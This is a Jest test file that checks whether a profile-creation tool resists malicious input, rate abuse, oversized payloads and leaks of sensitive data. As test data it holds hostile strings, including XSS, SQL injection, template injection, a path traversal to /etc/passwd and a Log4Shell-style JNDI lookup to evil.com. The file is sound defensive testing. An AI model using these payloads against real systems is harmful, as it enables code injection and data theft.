/**
 * Authentication and authorization security tests
 */

import { describe, test, expect } from '@jest/globals';
import { createProfile } from '../../src/tools/create_profile.js';
import { testUtils } from '../helpers/jest-setup.js';
import { getDatabase } from '../../src/db/database.js';

describe('Authentication and Authorization Security Tests', () => {

  describe('Input Sanitization and Validation', () => {
    test('should sanitize potentially malicious profile names', async () => {
      const maliciousProfileNames = [
        '<script>alert("xss")</script>Profile',
        'Profile"; DROP TABLE profiles; --',
        'Profile\\x00\\x01\\x02', // null bytes and control characters
        'Profile<iframe src="javascript:alert(1)">',
        'Profile{{7*7}}' // Template injection attempt
      ];

      for (const maliciousName of maliciousProfileNames) {
        const result = await createProfile({
          org_name: 'Security Test Org',
          sector: 'Technology',
          size: 'medium',
          profile_name: maliciousName
        });

        if (result.success) {
          // Profile name should be sanitized
          const responseStr = JSON.stringify(result);
          expect(responseStr).not.toContain('<script>');
          expect(responseStr).not.toContain('DROP TABLE');
          expect(responseStr).not.toContain('javascript:');
          expect(responseStr).not.toContain('<iframe');
          expect(responseStr).not.toContain('{{7*7}}');
        }
        // Rejection is also acceptable
      }
    });

    test('should validate API parameter formats', async () => {
      // Test invalid parameter formats that could be used for attacks
      const invalidParams = [
        { org_name: '../../../etc/passwd', sector: 'Technology', size: 'medium' },
        { org_name: '${jndi:ldap://evil.com/a}', sector: 'Technology', size: 'medium' },
        { org_name: '%00%00%00', sector: 'Technology', size: 'medium' }, // null bytes
        { org_name: Array(1000).fill('A').join(''), sector: 'Technology', size: 'medium' }, // very long
      ];

      for (const params of invalidParams) {
        const result = await createProfile(params);
        
        if (result.success) {
          // Should sanitize path traversal attempts
          expect(result.org_id).not.toContain('../');
          expect(result.org_id).not.toContain('/etc/');
          expect(result.org_id).not.toContain('passwd');
          expect(result.org_id).not.toContain('jndi:');
          expect(result.org_id).not.toContain('ldap://');
        }
      }
    });
  });

  describe('Rate Limiting Simulation', () => {
    test('should handle rapid successive API calls', async () => {
      const rapidCalls = Array.from({ length: 20 }, (_, i) =>
        createProfile({
          org_name: `Rapid Test Org ${i} ${Date.now()}`,
          sector: 'Technology',
          size: 'medium',
          profile_name: `Rapid Test Profile ${i}`
        })
      );

      const startTime = Date.now();
      const results = await Promise.allSettled(rapidCalls);
      const endTime = Date.now();

      // Should complete within reasonable time (not hang indefinitely)
      expect(endTime - startTime).toBeLessThan(30000); // 30 seconds max

      // Should handle the requests (either succeed or fail gracefully)
      const successCount = results.filter(r => 
        r.status === 'fulfilled' && r.value.success
      ).length;
      
      const failureCount = results.filter(r => 
        r.status === 'fulfilled' && !r.value.success
      ).length;
      
      const errorCount = results.filter(r => r.status === 'rejected').length;

      // Should have some combination of successes and controlled failures
      expect(successCount + failureCount + errorCount).toBe(20);
    });
  });

  describe('Resource Protection', () => {
    test('should prevent memory exhaustion attacks', async () => {
      // Test with very large payloads
      const largePayload = 'A'.repeat(50000); // 50KB string

      const result = await createProfile({
        org_name: largePayload,
        sector: 'Technology',
        size: 'medium',
        profile_name: 'Memory Test Profile',
        description: largePayload
      });

      // Should either handle gracefully or reject
      if (result.success) {
        expect(result.org_id).toBeDefined();
        // Should not echo back the full large payload
        expect(JSON.stringify(result).length).toBeLessThan(100000);
      }
      // Failure/rejection is also acceptable for security
    });

    test('should handle deeply nested objects safely', async () => {
      // Create deeply nested object that could cause stack overflow
      let deepObject: any = 'deep value';
      for (let i = 0; i < 100; i++) {
        deepObject = { nested: deepObject };
      }

      try {
        const result = await createProfile({
          org_name: 'Deep Nest Test',
          sector: 'Technology', 
          size: 'medium',
          profile_name: 'Deep Test Profile',
          // Try to inject the deep object
          description: JSON.stringify(deepObject).substring(0, 1000)
        } as any);

        // Should handle without crashing
        expect(result).toBeDefined();
        if (result.success) {
          expect(result.org_id).toBeDefined();
        }
      } catch (error) {
        // Graceful error handling is acceptable
        expect(error).toBeInstanceOf(Error);
      }
    });
  });

  describe('Logging and Audit Security', () => {
    test('should not log sensitive information', async () => {
      // Test that potentially sensitive data is not exposed in logs
      const sensitiveData = {
        org_name: 'Test Organization',
        sector: 'Technology',
        size: 'medium',
        profile_name: 'Profile with sensitive info',
        // Simulate sensitive data that shouldn't be logged
        notes: 'Password: secret123, SSN: 123-45-6789, API Key: abc123def456'
      };

      const result = await createProfile(sensitiveData as any);

      // The function should work (or fail safely)
      expect(result).toBeDefined();
      
      // We can't directly test logging here, but we can ensure
      // the response doesn't echo sensitive patterns
      const responseStr = JSON.stringify(result);
      
      // Should not contain obvious sensitive patterns in response
      if (result.success) {
        expect(responseStr).not.toMatch(/password:\s*\w+/i);
        expect(responseStr).not.toMatch(/\d{3}-\d{2}-\d{4}/); // SSN pattern
        expect(responseStr).not.toMatch(/api[_\s]*key:\s*\w+/i);
      }
    });
  });

  describe('Business Logic Security', () => {
    test('should validate business rules consistently', async () => {
      // Test edge cases that might bypass business logic
      const edgeCases = [
        { org_name: 'Test', sector: 'technology', size: 'MEDIUM' }, // case variations
        { org_name: ' Test Org ', sector: ' Technology ', size: ' medium ' }, // whitespace
        { org_name: 'Test\nOrg', sector: 'Technology', size: 'medium' }, // newlines
        { org_name: 'Test\tOrg', sector: 'Technology', size: 'medium' }, // tabs
      ];

      for (const testCase of edgeCases) {
        const result = await createProfile(testCase);
        
        if (result.success) {
          // Should normalize and validate properly
          expect(result.org_id).toBeDefined();
          expect(result.profile_id).toBeDefined();
          // Organization ID should not contain whitespace/special chars
          expect(result.org_id).not.toMatch(/[\s\n\t]/);
        }
      }
    });

    test('should prevent duplicate resource creation vulnerabilities', async () => {
      const duplicateAttempts = Array.from({ length: 5 }, () =>
        createProfile({
          org_name: `Duplicate Test Org ${Date.now()}`,
          sector: 'Technology',
          size: 'medium',
          profile_name: 'Duplicate Test Profile'
        })
      );

      const results = await Promise.all(duplicateAttempts);

      // Should handle duplicates appropriately
      const successResults = results.filter(r => r.success);
      
      if (successResults.length > 1) {
        // If multiple succeed, they should have different IDs
        const orgIds = successResults.map(r => r.org_id);
        const uniqueOrgIds = new Set(orgIds);
        expect(uniqueOrgIds.size).toBe(orgIds.length); // All should be unique
      }
    });
  });

  describe('Input Boundary Testing', () => {
    test('should handle edge case string lengths safely', async () => {
      const boundaryCases = [
        { org_name: '', sector: 'Technology', size: 'medium' }, // empty
        { org_name: 'A', sector: 'Technology', size: 'medium' }, // single char
        { org_name: 'AB', sector: 'Technology', size: 'medium' }, // two chars
        { org_name: 'A'.repeat(255), sector: 'Technology', size: 'medium' }, // typical DB limit
        { org_name: 'A'.repeat(256), sector: 'Technology', size: 'medium' }, // over typical limit
      ];

      for (const testCase of boundaryCases) {
        const result = await createProfile(testCase);
        
        // Should either succeed with valid data or fail gracefully
        if (result.success) {
          expect(result.org_id).toBeDefined();
          expect(typeof result.org_id).toBe('string');
          expect(result.org_id.length).toBeGreaterThan(0);
        } else {
          expect(result.message).toBeDefined();
          expect(typeof result.message).toBe('string');
        }
      }
    });
  });
});